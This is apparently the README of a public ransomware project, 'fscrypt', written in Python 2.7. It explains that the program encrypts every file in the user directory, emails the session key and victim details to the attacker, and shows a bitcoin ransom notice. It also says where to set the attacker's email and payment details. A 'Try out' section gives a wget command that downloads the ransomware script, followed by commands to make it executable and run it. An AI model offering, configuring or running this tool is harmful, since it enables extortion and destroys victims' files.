# fscrypt
Ransomware written in Python 2.7. Works on both Windows and Linux.

Demo: executing with debug=False

![imgur](https://i.imgur.com/pSuBAID.png)

## Warning
**Do not actually execute this on your Host OS!** especially...
```
fscrypt.start(debug=False)  --> Catastrophic!
```

## Overview
The program is quite simple. Once invoked, it generates `session_id` and `session_key`, 
then it starts encrypting all files under your user directory.
Finally, it will send the victim's machine info, session_id and session_key to the attacker
with an anonymous email service (through mechanize),
as well as displaying a notice to the victim, telling he/she to pay the ransom via bitcoin.

You may notice that I use `Node` and `LinkedList` to generate session_id and session_key.
(This sequence generator was actually one of my assignment when I was a freshmen).
It assembles a sequence with 0~68 unrepeatedly, in random order.

Check the object variable of fscrypt. You can set your email address and payment related stuff there.

## Requirements
* Python 2.7
  * pyCrypto (crypto operations)
  * urllib2 (retrieve user ipv4 address)
  * mechanize (send session_key via anonymous email)
  * webbrowser (open html notice at the end)

## Try out
```
wget https://raw.githubusercontent.com/aesophor/fscrypt/master/fscrypt.py
sudo chmod u+x fscrypt.py
./fscrypt.py
```
